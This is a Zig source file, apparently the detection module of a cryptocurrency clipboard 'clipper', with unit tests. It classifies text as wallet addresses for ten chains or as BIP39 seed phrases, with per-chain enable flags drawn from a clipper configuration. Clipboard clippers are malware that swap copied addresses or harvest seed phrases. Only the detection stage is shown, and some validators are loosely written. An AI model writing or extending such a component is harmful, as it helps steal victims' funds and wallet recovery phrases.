const std = @import("std");
const clipper_config = @import("clipper_config");
const bip39 = @import("bip39_wordlist.zig");

pub const Chain = enum {
    bitcoin,
    ethereum,
    solana,
    tron,
    litecoin,
    monero,
    dogecoin,
    bitcoin_cash,
    ripple,
    cardano,

    pub fn isEnabled(self: Chain) bool {
        return switch (self) {
            .bitcoin => clipper_config.BTC_ENABLED,
            .ethereum => clipper_config.ETH_ENABLED,
            .solana => clipper_config.SOL_ENABLED,
            .tron => clipper_config.TRX_ENABLED,
            .litecoin => clipper_config.LTC_ENABLED,
            .monero => clipper_config.XMR_ENABLED,
            .dogecoin => clipper_config.DOGE_ENABLED,
            .bitcoin_cash => clipper_config.BCH_ENABLED,
            .ripple => clipper_config.XRP_ENABLED,
            .cardano => clipper_config.ADA_ENABLED,
        };
    }

    pub fn label(self: Chain) []const u8 {
        return switch (self) {
            .bitcoin => "BTC",
            .ethereum => "ETH",
            .solana => "SOL",
            .tron => "TRX",
            .litecoin => "LTC",
            .monero => "XMR",
            .dogecoin => "DOGE",
            .bitcoin_cash => "BCH",
            .ripple => "XRP",
            .cardano => "ADA",
        };
    }
};

pub const DetectionType = enum { address, seed_phrase };

pub const Detection = struct {
    detect_type: DetectionType,
    chain: ?Chain,
    matched: []const u8,
    format: []const u8,
};

fn isBase58(s: []const u8) bool {
    if (s.len == 0) return false;
    for (s) |c| {
        switch (c) {
            '1'...'9', 'A'...'H', 'J'...'N', 'P'...'Z', 'a'...'k', 'm'...'z' => {},
            else => return false,
        }
    }
    return true;
}

fn isBase58Strict(s: []const u8) bool {
    if (s.len == 0) return false;
    for (s) |c| {
        switch (c) {
            '1'...'9', 'A'...'H', 'J'...'N', 'P'...'Z', 'a'...'k', 'm'...'z' => {},
            else => return false,
        }
    }
    return true;
}

fn isHex(s: []const u8) bool {
    if (s.len == 0) return false;
    for (s) |c| {
        if (!std.ascii.isHex(c)) return false;
    }
    return true;
}

fn isLowerHex(s: []const u8) bool {
    if (s.len == 0) return false;
    for (s) |c| {
        if (!std.ascii.isHex(c)) return false;
    }
    return true;
}

fn startsWith(s: []const u8, prefix: []const u8) bool {
    if (s.len < prefix.len) return false;
    return std.mem.eql(u8, s[0..prefix.len], prefix);
}

// ── BTC: 4 formats ──

fn isBtcTaproot(s: []const u8) bool {
    return s.len == 62 and startsWith(s, "bc1p") and isBase58(s[4..]);
}

fn isBtcSegWit(s: []const u8) bool {
    if (s.len < 43 or s.len > 63) return false;
    if (!startsWith(s, "bc1")) return false;
    if (s.len > 3 and s[3] == 'p') return false;
    return isBase58(s[3..]);
}

fn isBtcLegacy(s: []const u8) bool {
    if (s.len < 26 or s.len > 35) return false;
    if (s[0] != '1' and s[0] != '3') return false;
    return isBase58(s[1..]);
}

// ── ETH ──

fn isEth(s: []const u8) bool {
    return s.len == 42 and startsWith(s, "0x") and isHex(s[2..]);
}

// ── TRX ──

fn isTron(s: []const u8) bool {
    return s.len == 34 and s[0] == 'T' and isBase58(s[1..]);
}

// ── SOL ──

fn isSolana(s: []const u8) bool {
    if (s.len < 32 or s.len > 44) return false;
    return isBase58(s);
}

// ── LTC: 2 formats ──

fn isLtcSegWit(s: []const u8) bool {
    if (s.len < 43 or s.len > 63) return false;
    return startsWith(s, "ltc1") and isBase58(s[4..]);
}

fn isLtcLegacy(s: []const u8) bool {
    if (s.len < 26 or s.len > 35) return false;
    if (s[0] != 'L' and s[0] != 'M' and s[0] != '3') return false;
    return isBase58(s[1..]);
}

// ── XMR: 2 formats ──

fn isMonero(s: []const u8) bool {
    if (s.len < 95 or s.len > 106) return false;
    if (s[0] != '4' and s[0] != '8') return false;
    return isBase58(s);
}

// ── DOGE ──

fn isDogecoin(s: []const u8) bool {
    if (s.len < 26 or s.len > 35) return false;
    if (s[0] != 'D') return false;
    return isBase58(s[1..]);
}

// ── BCH: 2 formats ──

fn isBchFull(s: []const u8) bool {
    if (!startsWith(s, "bitcoincash:")) return false;
    const body = s[12..];
    if (body.len < 42 or body.len > 60) return false;
    if (body[0] != 'q' and body[0] != 'p') return false;
    return isBase58(body[1..]);
}

fn isBchCashAddr(s: []const u8) bool {
    if (s.len < 42 or s.len > 44) return false;
    if (s[0] != 'q' and s[0] != 'p') return false;
    return isBase58(s[1..]);
}

// ── XRP ──

fn isXrp(s: []const u8) bool {
    if (s.len < 25 or s.len > 35) return false;
    if (s[0] != 'r') return false;
    return isBase58(s[1..]);
}

// ── ADA (Shelley addr1) ──

fn isCardano(s: []const u8) bool {
    if (s.len < 28 or s.len > 110) return false;
    return startsWith(s, "addr1") and isBase58(s[5..]);
}

pub fn detect(text: []const u8) ?Detection {
    const trimmed = std.mem.trim(u8, text, " \t\n\r\x00");
    if (trimmed.len < clipper_config.MIN_ADDR_LEN or trimmed.len > clipper_config.MAX_ADDR_LEN) return null;

    // Try BIP39 seed phrase first (least likely to false-positive)
    var tokenizer = std.mem.tokenizeScalar(u8, trimmed, ' ');
    var tokens: [32][]const u8 = undefined;
    var token_count: usize = 0;
    while (tokenizer.next()) |token| : (token_count += 1) {
        if (token_count >= 32) break;
        tokens[token_count] = token;
    }
    if (bip39.detectPhrase(tokens[0..token_count])) |pt| {
        return Detection{
            .detect_type = .seed_phrase,
            .chain = null,
            .matched = trimmed[0..@min(trimmed.len, 48)],
            .format = @tagName(pt),
        };
    }

    // Address chain cascade — ordered by specificity
    if (isBtcTaproot(trimmed)) return addrDet(.bitcoin, trimmed, "Taproot (bc1p)");
    if (isBtcSegWit(trimmed)) return addrDet(.bitcoin, trimmed, "SegWit (bc1)");
    if (isBtcLegacy(trimmed)) return addrDet(.bitcoin, trimmed, "Legacy (1/3)");
    if (isEth(trimmed)) return addrDet(.ethereum, trimmed, "EVM (0x)");
    if (isTron(trimmed)) return addrDet(.tron, trimmed, "Base58 (T)");
    if (isSolana(trimmed)) return addrDet(.solana, trimmed, "Base58");
    if (isLtcSegWit(trimmed)) return addrDet(.litecoin, trimmed, "SegWit (ltc1)");
    if (isLtcLegacy(trimmed)) return addrDet(.litecoin, trimmed, "Legacy (L/M)");
    if (isMonero(trimmed)) return addrDet(.monero, trimmed, "Standard (4/8)");
    if (isDogecoin(trimmed)) return addrDet(.dogecoin, trimmed, "Legacy (D)");
    if (isBchFull(trimmed)) return addrDet(.bitcoin_cash, trimmed, "Full (bitcoincash:)");
    if (isBchCashAddr(trimmed)) return addrDet(.bitcoin_cash, trimmed, "CashAddr (q)");
    if (isXrp(trimmed)) return addrDet(.ripple, trimmed, "Ripple (r)");
    if (isCardano(trimmed)) return addrDet(.cardano, trimmed, "Shelley (addr1)");

    return null;
}

fn addrDet(chain: Chain, matched: []const u8, format: []const u8) Detection {
    return Detection{ .detect_type = .address, .chain = chain, .matched = matched, .format = format };
}

// ── Tests ──

const expect = std.testing.expect;
const expectEqual = std.testing.expectEqual;

test "btc taproot valid" {
    try expect(detect("bc1p5d7rjq7g6rdk2yhzks9smlaqtedr4dekq08ge8qt2acpp4yx4gq7qx2j3") != null);
}

test "btc segwit valid" {
    try expect(detect("bc1qr8vgrcvacyea68gk6w0kdzt2xcc93azzhalyjl") != null);
}

test "btc legacy valid" {
    try expect(detect("1BoatSLRHtKNngkdXEeobR76b53LETtpyT") != null);
}

test "btc p2sh valid" {
    try expect(detect("3EBa4JbKY3HJx6KZopR1sV1upEvxm3dwR1") != null);
}

test "eth valid" {
    try expect(detect("0x22f24a22b6f824E9ef76B05B186c4D0C2Df58d67") != null);
}

test "trx valid" {
    try expect(detect("TBFqTqF17fRvSXDh7U8k5mVFxjqkKrWUXm") != null);
}

test "sol valid" {
    try expect(detect("7UQuwTTbZ9SoMY1E8D3DMyPjFCPCXjED2wcj8uhshyzW") != null);
}

test "ltc segwit valid" {
    try expect(detect("ltc1qxa03u2udf0a6znuhrrxc6wc4q28wmceh8muqyl") != null);
}

test "ltc legacy valid" {
    try expect(detect("LfhS8tpgxY59TUnjybJCYmJMHa3BeUaASQ") != null);
}

test "xmr standard valid" {
    try expect(detect("48SWwQ7QUSSPhHS9zWF9V9TKyK7FZVxDd9LghKbbkkYzB3AbhyKaCozMc26siguA2b6tce6tztCTXCWgyrypBLmW7HRxs6D") != null);
}

test "doge valid" {
    try expect(detect("DDrusqzPjEovYyFrtDV8PVZVZDFFvpGAkc") != null);
}

test "bch cashaddr valid" {
    try expect(detect("qp5c3syh4t750jwpljzdmnndddlj7zg64gjhxgm8nd") != null);
}

test "bch full valid" {
    try expect(detect("bitcoincash:qp5c3syh4t750jwpljzdmnndddlj7zg64gjhxgm8nd") != null);
}

test "xrp valid" {
    try expect(detect("rfzq3PnZAt6eFKcJ9TXHsAm2c8GuguHUc1") != null);
}

test "ada shelley valid" {
    try expect(detect("addr1qytkt94c60hcg27hd9n3zgejxlha6c0v0rpaufgrvxzprkshvktt35l0ss4aw6t8zy3nydl0m4s7c7xrmcjsxcvyz8dqxlg07g") != null);
}

test "invalid random text" {
    try expect(detect("hello world this is not an address") == null);
}

test "invalid short text" {
    try expect(detect("hi") == null);
}

test "invalid btc-like but wrong charset" {
    try expect(detect("bc1ooOOooOOooOOooOOooOOooOOooOOooOOooOOoo") == null);
}

test "eth mixed case valid" {
    try expect(detect("0x22f24a22b6f824E9ef76B05B186c4D0C2Df58d67") != null);
}

test "detect returns correct chain type" {
    const result = detect("bc1qr8vgrcvacyea68gk6w0kdzt2xcc93azzhalyjl");
    try expect(result != null);
    try expect(result.?.detect_type == .address);
    try expect(result.?.chain.? == .bitcoin);
}

test "detect returns seed phrase" {
    const text = "abandon ability able about above absent absorb abstract absurd abuse access accident";
    const result = detect(text);
    try expect(result != null);
    try expect(result.?.detect_type == .seed_phrase);
}

test "empty text returns null" {
    try expect(detect("") == null);
}

test "whitespace only returns null" {
    try expect(detect("   \t\n  ") == null);
}

test "btc too short" {
    try expect(detect("1abc") == null);
}

test "eth wrong prefix" {
    try expect(detect("1x22f24a22b6f824E9ef76B05B186c4D0C2Df58d67") == null);
}

test "trx wrong first char" {
    try expect(detect("XBFqTqF17fRvSXDh7U8k5mVFxjqkKrWUXm") == null);
}

test "all chains enabled by default" {
    try expect(Chain.bitcoin.isEnabled());
    try expect(Chain.ethereum.isEnabled());
    try expect(Chain.monero.isEnabled());
}
